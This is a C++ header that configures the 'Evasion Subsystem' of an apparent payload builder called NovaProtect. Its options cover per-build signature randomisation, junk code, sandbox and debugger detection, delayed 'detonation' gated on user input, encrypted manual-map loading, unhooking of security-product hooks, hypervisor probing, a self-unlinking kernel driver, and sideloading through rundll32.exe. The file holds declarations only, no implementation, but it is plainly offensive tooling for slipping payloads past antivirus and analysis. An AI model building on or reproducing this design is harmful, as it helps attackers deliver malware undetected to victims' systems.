#pragma once
// NovaProtect Evasion Subsystem - umbrella configuration.
//
// One EvasionConfig object drives six generator families:
//
//   static   (evasion_static.h)   image post-pass: Rich/DOS stub, timestamps,
//                                 section names, PDB, padding, signature dir
//   junk     (junk_emitter.h)     x64 junk-code ("flower instruction") blocks
//   dynamic  (evasion_dynamic.h)  host classification + anti-analysis stubs
//   loader   (mem_loader.h)       encrypted region plan / manual-map driver
//   unhook   (api_unhook.h)       clean-image restoration table for hooked APIs
//   white    (white_launcher.h)   signed-host launch plans (LOLBin sideload)
//
// The profile presets only set defaults; every switch stays individually
// settable so the UI can express "paranoid, except keep the timestamp".

#include "evasion_entropy.h"

#include <cstdint>
#include <string>
#include <vector>

namespace np {

enum class EvasionProfile : uint8_t {
    Off        = 0,
    Balanced   = 1,   // static scrubbing + light junk + startup delay
    Aggressive = 2,   // + encrypted region streaming, hook restoration
    Paranoid   = 3,   // + decoys, longer gates, deeper rewrite
};

struct EvasionConfig {
    EvasionProfile profile = EvasionProfile::Off;
    // 0 = derive a fresh seed from system entropy, so two builds never share a
    // byte signature. A non-zero value reproduces a build exactly.
    uint64_t seed = 0;
    // Planned from the seed: tag, nonce, section suffix, filler, probe order,
    // key salt. Generators read this instead of re-deriving their own.
    BuildSignature build;
    // Explicit "reseed before this build even if a seed was set": the manual
    // refresh switch in the CLI and the UI.
    bool reseed = false;

    // --- static image evasion -------------------------------------------
    bool static_rich_scrub    = true;  // erase Rich header + DOS stub name
    bool static_timestamp     = true;  // replace TimeDateStamp
    bool static_section_rename = true; // rename non-.np sections
    bool static_strip_pdb     = true;  // drop CodeView entries
    bool static_pad_fill      = true;  // junk-fill section slack
    bool static_drop_signature = true; // drop an invalid Authenticode blob
    bool static_checksum      = true;  // recompute CheckSum

    // --- junk code -------------------------------------------------------
    uint8_t junk_density      = 2;     // blocks per injected site (0..8)
    bool junk_opaque          = true;  // include opaque-predicate branches
    bool junk_decoy_strings   = true;  // plant decoy strings in dead branches

    // --- dynamic / anti-analysis ----------------------------------------
    uint8_t anti_sandbox_level = 2;    // 0..3, drives the weighted score
    uint8_t anti_debug_level   = 2;    // 0..3
    uint32_t detonate_delay_ms = 2500; // pre-execution gate
    uint32_t host_score_threshold = 40;
    bool presence_gate        = true;  // require user input before detonating
    bool timing_channel       = true;  // RDTSC/CPUID serialization checks

    // --- loader / memory obfuscation ------------------------------------
    bool loader_split_regions = true;  // one allocation per region, not one RWX
    bool loader_no_rwx        = true;  // RW -> RX transitions only
    uint32_t mem_window       = 4096;  // decrypt-on-demand window
    uint8_t mem_stream_rounds = 2;     // keystream passes

    // --- API unhooking ---------------------------------------------------
    bool unhook_text_restore  = true;  // restore hook overwrites from disk
    bool unhook_iat_sweep     = true;  // detect IAT-redirect hooks

    // --- hypervisor level ------------------------------------------------
    // The vendor/exit-cost probes answer "am I inside a hypervisor" without
    // trusting the bit the hypervisor publishes about itself.
    bool hypervisor_vendor_probe = true;   // CPUID.40000000H vendor + leaf space
    bool hypervisor_exit_cost    = true;   // 16 serialised CPUIDs vs bare-metal budget
    bool hypervisor_stealth_time = true;   // KUSER_SHARED_DATA instead of a syscall
    bool hypervisor_stealth_single_cpuid = true;  // one round-trip, not two
    bool hypervisor_stealth_avoid_rdtscp = true;  // no RDTSCP/RDPMC

    // --- driver (kernel artifact) level ----------------------------------
    // 0 off, 1 artifacts only, 2 + KUSER_SHARED_DATA tick continuity, 3 + all.
    uint8_t kernel_level = 2;
    bool kernel_stealth = true;        // hash-resolved exports, no driver load
    bool kernel_scrub_driver = false;  // emitted driver unlinks its module entry

    // --- signed-host (white) utilisation --------------------------------
    std::string white_host   = "rundll32.exe";
    std::string white_export = "DllMain";

    bool enabled() const { return profile != EvasionProfile::Off; }

    // Plans `build` from the seed. seed == 0 (or reseed == true) draws a fresh
    // 64-bit value from system entropy, which is what makes every build differ;
    // any non-zero seed reproduces the build byte for byte.
    void planSignature(uint64_t forced_seed = 0);

    static EvasionConfig forProfile(EvasionProfile profile, uint64_t seed = 0);

    // Single-line summary for build logs and the UI activity page.
    std::string describe() const;

    // The manifest the UI shows and `-evasion-manifest` writes.
    std::string manifest() const { return build.ToJson(); }

    // Load a manifest produced by an earlier build; the seed inside it drives
    // every derived field, so the rebuild is identical.
    bool applyManifest(const std::string& text, std::string* error = nullptr);

    // key=value blob consumed by the x64 runtime blob. Stable field names:
    // the runtime and this header must agree, so both are listed in
    // docs/evasion-modules.md.
    std::string runtimePolicy() const;
};

const char* evasionProfileName(EvasionProfile profile);
bool parseEvasionProfile(const std::string& text, EvasionProfile& out);

} // namespace np
